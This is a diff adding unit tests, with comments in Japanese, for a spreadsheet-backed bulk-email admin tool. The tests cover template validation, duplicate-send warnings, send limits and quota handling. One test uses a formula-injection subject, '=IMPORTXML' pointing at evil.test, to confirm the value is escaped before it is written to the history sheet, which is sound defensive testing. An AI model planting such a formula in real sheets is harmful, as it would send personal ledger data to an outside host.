@@ -124,7 +124,8 @@ function makeBox(opts) {
   // ここを写すと「模擬では通るのに本番で落ちる」がまた起きる
   const ADMIN = read('gas/Admin.gs');
   // indexOf_ は列が無ければ例外を投げる。**この厳しさごと**借りるのが要点
-  ['indexOf_', 'liveRows_', 'cell_', 'asText_'].forEach(fn => {
+  // safeCellText_ は「シートで数式として動く値」を止める。**本物を借りる**
+  ['indexOf_', 'liveRows_', 'cell_', 'asText_', 'safeCellText_'].forEach(fn => {
     vm.runInContext(GASBOX.cutFunction(ADMIN, fn), box);
   });
   vm.runInContext(ADMIN.slice(ADMIN.indexOf('var COL = {'),
@@ -320,6 +321,29 @@ describe('文面の検査（broadcastValidate_）', () => {
 
   test('本文が長すぎたら断る', () => {
     assert.ok(errs('件名', 'あ'.repeat(20001)).join('').indexOf('本文') >= 0);
+  });
+
+  /*
+   * 件名と本文をつないで1つの文字列として検査していたので、
+   * **境目をまたいだ差し込み**が「正しい形」に見えて通っていた
+   * （2026-09-08、検証役が発見）。
+   * 送るときは件名と本文が別々に組み立てられるので、
+   * どちらにも `{{` が生のまま残って届く。
+   */
+  test('件名と本文の境目をまたぐ差し込みを断る', () => {
+    const e = errs('件名 {{', 'お名前}} 様').join('');
+    assert.ok(e.length > 0, '境目をまたいだ差し込みが素通りしています');
+  });
+
+  /* `{{お名前}}}` は余った `}` がそのまま届く（「中村 美咲} 様」） */
+  test('余分な閉じ括弧を断る', () => {
+    const e = errs('件名', '{{お名前}}} 様').join('');
+    assert.ok(e.length > 0, '余った閉じ括弧が素通りしています');
+  });
+
+  test('括弧を使っていない普通の文面は通る', () => {
+    assert.deepStrictEqual(
+      errs('【ご案内】お知らせ', '{{お名前}} 様' + NL + '（※お手数ですが…）'), []);
   });
 });
 
@@ -532,6 +556,57 @@ describe('直前の送信との照合（broadcastRecent_）', () => {
     const r = call(box, 'broadcastRecent_', '当日のご案内', ['SB-0001']);
     assert.deepStrictEqual(r.ids, []);
   });
+
+  /*
+   * ■ 1行で打ち切ってはいけない（2026-09-08、検証役が発見）
+   *
+   *   一度に送れるのは40社なので、50社の催促は**必ず2回に分かれる**。
+   *   そのあと全社を選び直すと、最初に当たった1行（後半のバッチ）しか
+   *   報せず、**前半40社には無警告で2通目が届く**。
+   */
+  test('複数回に分けて送っていても、重なった相手を全部返す', () => {
+    const box = withLog([
+      logRow({ '送信ID': 'BC-20261007-1', '送信日時': '2026-10-07 10:00',
+               '宛先の受付ID': 'SB-0001,SB-0002' }),
+      logRow({ '送信ID': 'BC-20261007-2', '送信日時': '2026-10-07 11:00',
+               '宛先の受付ID': 'SB-0003' }),
+    ], { now: new Date(2026, 9, 7, 12, 0) });
+
+    const r = call(box, 'broadcastRecent_', '当日のご案内',
+      ['SB-0001', 'SB-0003', 'SB-0009']);
+    assert.deepStrictEqual(r.ids.slice().sort(), ['SB-0001', 'SB-0003'],
+      '前のバッチの相手を報せていません：' + JSON.stringify(r));
+    // 直近の送信の日時を出す（人が「さっき送ったやつだ」と分かるように）
+    assert.strictEqual(r.sentAt, '2026-10-07 11:00');
+  });
+
+  /*
+   * 数式よけのクォートが付いた件名でも、照合が一致すること。
+   * ここがずれると、二重送信の警告が黙って効かなくなる。
+   */
+  test('数式よけのクォートが付いていても、件名が一致する', () => {
+    const box = withLog([logRow({ '件名': "'-1+1" })],
+      { now: new Date(2026, 9, 7, 12, 0) });
+    const r = call(box, 'broadcastRecent_', '-1+1', ['SB-0001']);
+    assert.deepStrictEqual(r.ids, ['SB-0001'],
+      'クォート付きの件名を照合できていません：' + JSON.stringify(r));
+  });
+
+  /*
+   * 見出しを人が短くしただけで、警告が黙って効かなくなっていた
+   * （2026-09-08、検証役が発見）。**黙って正常を作らない。**
+   */
+  test('見出しが壊れていたら、そのことを返す', () => {
+    const box = makeBox({ now: new Date(2026, 9, 7, 12, 0) });
+    // 見出しを1つ書き換える（人がシートの列名を短くした状態）
+    const sh = vm.runInContext('sheet_', box)('一斉メール履歴');
+    sh.grid[0][sh.grid[0].indexOf('宛先の受付ID')] = '宛先';
+    sh.grid.push(sh.grid[0].map(() => ''));   // 1行でも中身が要る
+
+    const r = call(box, 'broadcastRecent_', '当日のご案内', ['SB-0001']);
+    assert.strictEqual(r.headBroken, true,
+      '見出しが壊れているのに、黙って「重なりなし」と答えています');
+  });
 });
 
 /*
@@ -722,12 +797,51 @@ describe('送信（adminBroadcastSend_）', () => {
     assert.strictEqual(r.res.error, 'quota');
   });
 
-  test('一度に送れる上限を超えたら送らない', () => {
+  test('一度に送れる上限を超えたら、画面に伝えて札を出さない', () => {
     const many = [];
     for (let i = 1; i <= 41; i++) many.push(L('SB-' + String(i).padStart(4, '0')));
     const r = run(many, many.map(x => x['受付ID']));
     assert.deepStrictEqual(r.box.__sentTo, [], '上限を超えたのに送りはじめています');
-    assert.strictEqual(r.res.ok, false);
+    assert.strictEqual(r.pre.tooMany, true, '上限を超えたことを画面に伝えていません');
+    assert.strictEqual(r.pre.ticket, '', '送れないのに札を出しています');
+  });
+
+  /*
+   * 上の検査は「画面に札を出さない」ことしか見られない
+   * （プレビューが札を出さないので、送信側の判定に届かない）。
+   * **サーバー側の上限は、札を手で作って直接ぶつけて確かめる。**
+   * 守りが二重にかかっているとき、片方だけを見る検査は
+   * もう片方が外れても落ちない（2026-09-08、壊し検査で発覚）。
+   */
+  test('札を持っていても、サーバーが41件目を断る', () => {
+    const box = makeBox({ now: new Date(2026, 9, 7, 12, 0) });
+    const many = [];
+    for (let i = 1; i <= 41; i++) many.push(L('SB-' + String(i).padStart(4, '0')));
+    box.readLedger_ = () => ({ headers: LH, rows: many.map(r => LH.map(h => r[h])) });
+    const ids = many.map(x => x['受付ID']);
+    const ticket = vm.runInContext('broadcastTicket_', box)('件名', '{{お名前}} 様', ids);
+
+    const res = call(box, 'adminBroadcastSend_', { person: '小谷' },
+      { confirm: true, ids: ids, subject: '件名', body: '{{お名前}} 様', ticket: ticket });
+
+    assert.deepStrictEqual(box.__sentTo, [], '上限を超えたのに送りはじめています');
+    assert.strictEqual(res.error, 'too_many', JSON.stringify(res));
+  });
+
+  /*
+   * 数式として動く値を、履歴シートにそのまま書かない。
+   * 直接の害（=IMPORTXML で台帳の個人情報を外部URLに載せる）に加えて、
+   * 数式化したセルは getValues() が計算結果を返すので、
+   * **24時間の二重送信警告が黙って死ぬ**（2026-09-08、検証役が指摘）。
+   */
+  test('履歴シートに、数式として動く件名をそのまま書かない', () => {
+    const r = run([L('SB-0001')], ['SB-0001'], null,
+      { subject: '=IMPORTXML("https://evil.test","//a")' });
+    assert.strictEqual(r.res.ok, true, JSON.stringify(r.res));
+    const g = r.box.__sheets['一斉メール履歴'].grid;
+    const cell = String(g[1][g[0].indexOf('件名')]);
+    assert.strictEqual(cell.charAt(0), "'",
+      '数式として動く件名が、そのまま書かれています：' + cell);
   });
 
   test('1件失敗しても、残りは送り、失敗を返す', () => {
@@ -780,6 +894,56 @@ describe('送信（adminBroadcastSend_）', () => {
 
     assert.strictEqual(pre.historyReady, false, '履歴シートの不在を伝えていません');
     assert.strictEqual(pre.ticket, '', '送れないのに札を出しています');
+  });
+
+  /*
+   * ■ 送り終えたあとの記録で例外が出ても、「送信できませんでした」と言わない
+   *
+   *   `appendHistory` は変更履歴シートに書く。そこが壊れていると例外になり、
+   *   `gas/Api.gs` が**文言なしの server_error** に潰す。
+   *   画面には「送信できませんでした」だけが出るが、**メールは全部届いている**。
+   *   押した人は届いていないと思って**もう一度送る**（2026-09-08、検証役が発見）。
+   */
+  test('送ったあとの記録で失敗しても、送れたことを伝える', () => {
+    const box = makeBox({ now: new Date(2026, 9, 7, 12, 0) });
+    const ledger = { headers: LH, rows: [L('SB-0001')].map(r => LH.map(h => r[h])) };
+    box.readLedger_ = () => ledger;
+    box.appendHistory = () => { throw new Error('シート「変更履歴」が見つかりません'); };
+
+    const pre = call(box, 'adminBroadcastPreview_', { person: '小谷' },
+      { ids: ['SB-0001'], subject: '件名', body: '{{お名前}} 様' });
+    const res = call(box, 'adminBroadcastSend_', { person: '小谷' },
+      { confirm: true, ids: ['SB-0001'], subject: '件名', body: '{{お名前}} 様',
+        ticket: pre.ticket });
+
+    assert.strictEqual(box.__sentTo.length, 1, '送られていません');
+    assert.strictEqual(res.ok, true,
+      '届いているのに「送信できませんでした」と答えています：' + JSON.stringify(res));
+  });
+
+  /*
+   * 送信可能数の確認が**札を消費したあと**だったので、
+   * 足りなかったときに札まで失い、プレビューからやり直しになっていた。
+   * 分ければ今日送れるのに「明日あらためて」と言うのも実態と違う。
+   */
+  test('送信可能数が足りないときは、札を使い切らない', () => {
+    const box = makeBox({ now: new Date(2026, 9, 7, 12, 0), quota: 1 });
+    const ledger = { headers: LH,
+      rows: [L('SB-0001'), L('SB-0002')].map(r => LH.map(h => r[h])) };
+    box.readLedger_ = () => ledger;
+    const p = { ids: ['SB-0001', 'SB-0002'], subject: '件名', body: '{{お名前}} 様' };
+    const pre = call(box, 'adminBroadcastPreview_', { person: '小谷' }, p);
+
+    const a = call(box, 'adminBroadcastSend_', { person: '小谷' },
+      Object.assign({ confirm: true, ticket: pre.ticket }, p));
+    assert.strictEqual(a.error, 'quota', JSON.stringify(a));
+
+    // 同じ札がまだ使える（残量が戻れば、そのまま送れる）
+    box.MailApp = { getRemainingDailyQuota: () => 1000 };
+    const b = call(box, 'adminBroadcastSend_', { person: '小谷' },
+      Object.assign({ confirm: true, ticket: pre.ticket }, p));
+    assert.strictEqual(b.ok, true,
+      '残量が足りなかっただけで札を失っています：' + JSON.stringify(b));
   });
 
   test('履歴シートが無ければ、1通も送らない（記録が残せないため）', () => {
